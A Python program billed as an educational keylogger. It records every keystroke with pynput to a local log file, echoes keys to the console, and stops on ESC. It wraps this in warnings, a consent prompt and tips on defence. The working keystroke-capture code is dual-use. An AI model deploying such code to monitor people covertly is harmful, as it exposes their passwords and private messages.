"""
EDUCATIONAL KEYLOGGER PROGRAM
==============================
WARNING: This program is for EDUCATIONAL PURPOSES ONLY.
- Only use on your own computer
- Unauthorized keylogging is ILLEGAL
- This is for learning about cybersecurity concepts

This program demonstrates how keyloggers work to help you:
1. Understand security vulnerabilities
2. Learn about input monitoring
3. Appreciate the importance of system security
"""

from pynput import keyboard
from datetime import datetime
import os


class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.keys_pressed = []
        
    def on_press(self, key):
        """Called when a key is pressed"""
        try:
            # Get the current timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Handle regular character keys
            if hasattr(key, 'char') and key.char is not None:
                key_data = f"[{timestamp}] Key: {key.char}\n"
                self.keys_pressed.append(key.char)
            else:
                # Handle special keys (Space, Enter, etc.)
                key_name = str(key).replace('Key.', '')
                key_data = f"[{timestamp}] Special: {key_name}\n"
                
                # Add readable format for special keys
                if key == keyboard.Key.space:
                    self.keys_pressed.append(' ')
                elif key == keyboard.Key.enter:
                    self.keys_pressed.append('\n')
                elif key == keyboard.Key.tab:
                    self.keys_pressed.append('\t')
            
            # Write to log file
            with open(self.log_file, 'a') as f:
                f.write(key_data)
            
            # Also display in console for educational purposes
            print(key_data.strip())
            
        except Exception as e:
            print(f"Error logging key: {e}")
    
    def on_release(self, key):
        """Called when a key is released - used to stop the logger"""
        # Stop listener if ESC is pressed
        if key == keyboard.Key.esc:
            print("\n" + "=" * 60)
            print("ESC pressed - Stopping keylogger...")
            print("=" * 60)
            return False
    
    def start(self):
        """Start the keylogger"""
        print("=" * 60)
        print("KEYLOGGER STARTED")
        print("=" * 60)
        print(f"Logging keystrokes to: {self.log_file}")
        print("Press ESC to stop logging")
        print("=" * 60)
        print("\nRecording keys...\n")
        
        # Create/clear the log file
        with open(self.log_file, 'w') as f:
            f.write(f"=== Keylogger Session Started at {datetime.now()} ===\n\n")
        
        # Start listening to keyboard events
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        
        # Session ended
        with open(self.log_file, 'a') as f:
            f.write(f"\n=== Session Ended at {datetime.now()} ===\n")
        
        print(f"\n✓ Keystrokes saved to: {self.log_file}")
        self.display_summary()
    
    def display_summary(self):
        """Display a summary of logged keys"""
        print("\n" + "=" * 60)
        print("SESSION SUMMARY")
        print("=" * 60)
        
        if os.path.exists(self.log_file):
            with open(self.log_file, 'r') as f:
                content = f.read()
                lines = content.split('\n')
                key_count = len([l for l in lines if l.strip() and 'Key:' in l or 'Special:' in l])
                
                print(f"Total keys logged: {key_count}")
                print(f"Log file size: {os.path.getsize(self.log_file)} bytes")
                print(f"Log file location: {os.path.abspath(self.log_file)}")
        
        print("=" * 60)


def view_log_file(log_file="keylog.txt"):
    """View the contents of the log file"""
    if not os.path.exists(log_file):
        print(f"\n⚠ Log file '{log_file}' not found!")
        return
    
    print("\n" + "=" * 60)
    print("LOG FILE CONTENTS")
    print("=" * 60)
    
    with open(log_file, 'r') as f:
        content = f.read()
        print(content)
    
    print("=" * 60)


def clear_log_file(log_file="keylog.txt"):
    """Clear the log file"""
    if os.path.exists(log_file):
        os.remove(log_file)
        print(f"\n✓ Log file '{log_file}' has been cleared.")
    else:
        print(f"\n⚠ Log file '{log_file}' does not exist.")


def show_educational_info():
    """Display educational information about keyloggers"""
    print("\n" + "=" * 60)
    print("EDUCATIONAL INFORMATION ABOUT KEYLOGGERS")
    print("=" * 60)
    
    info = """
WHAT IS A KEYLOGGER?
A keylogger is a program that records keyboard input. While this program
is for educational purposes, keyloggers can be used maliciously.

HOW KEYLOGGERS WORK:
1. Monitor keyboard events
2. Capture each keystroke
3. Save the data to a file or send it remotely
4. Can capture passwords, messages, and sensitive data

PROTECTION AGAINST KEYLOGGERS:
• Use anti-virus and anti-malware software
• Keep your operating system updated
• Don't download suspicious files
• Use virtual keyboards for sensitive data
• Enable two-factor authentication
• Be cautious with USB devices
• Monitor running processes regularly

LEGAL WARNING:
• Using keyloggers without permission is ILLEGAL
• Only use on systems you own
• Respect privacy and laws
• This is for educational purposes only

ETHICAL USE:
✓ Learning about cybersecurity
✓ Understanding security vulnerabilities
✓ Parental monitoring (with disclosure)
✓ Employee monitoring (with consent and disclosure)
✗ Spying on others without consent
✗ Stealing passwords or sensitive data
✗ Any unauthorized monitoring
"""
    print(info)
    print("=" * 60)


def main():
    log_file = "keylog.txt"
    
    print("=" * 60)
    print("EDUCATIONAL KEYLOGGER PROGRAM")
    print("=" * 60)
    print("⚠ WARNING: For Educational Purposes Only!")
    print("⚠ Only use on your own computer")
    print("=" * 60)
    
    while True:
        print("\n" + "=" * 60)
        print("MENU")
        print("=" * 60)
        print("1. Start Keylogger (Press ESC to stop)")
        print("2. View Log File")
        print("3. Clear Log File")
        print("4. Educational Information")
        print("5. Exit")
        
        choice = input("\nEnter your choice (1-5): ").strip()
        
        if choice == '1':
            # Confirm user understands this is for educational purposes
            print("\n" + "-" * 60)
            print("⚠ IMPORTANT REMINDER:")
            print("This keylogger will record ALL keystrokes.")
            print("Only use this on your own computer for learning purposes.")
            print("-" * 60)
            
            confirm = input("Do you understand and agree? (yes/no): ").strip().lower()
            
            if confirm == 'yes':
                try:
                    keylogger = Keylogger(log_file)
                    keylogger.start()
                except KeyboardInterrupt:
                    print("\n\n⚠ Keylogger interrupted by user")
                except Exception as e:
                    print(f"\n⚠ Error: {e}")
            else:
                print("\n✓ Keylogger not started.")
        
        elif choice == '2':
            view_log_file(log_file)
        
        elif choice == '3':
            confirm = input("\nAre you sure you want to clear the log file? (yes/no): ").strip().lower()
            if confirm == 'yes':
                clear_log_file(log_file)
        
        elif choice == '4':
            show_educational_info()
        
        elif choice == '5':
            print("\n" + "=" * 60)
            print("Thank you for using the Educational Keylogger Program!")
            print("Remember: Use technology responsibly and ethically.")
            print("=" * 60)
            break
        
        else:
            print("\n⚠ Invalid choice! Please enter 1-5.")


if __name__ == "__main__":
    main()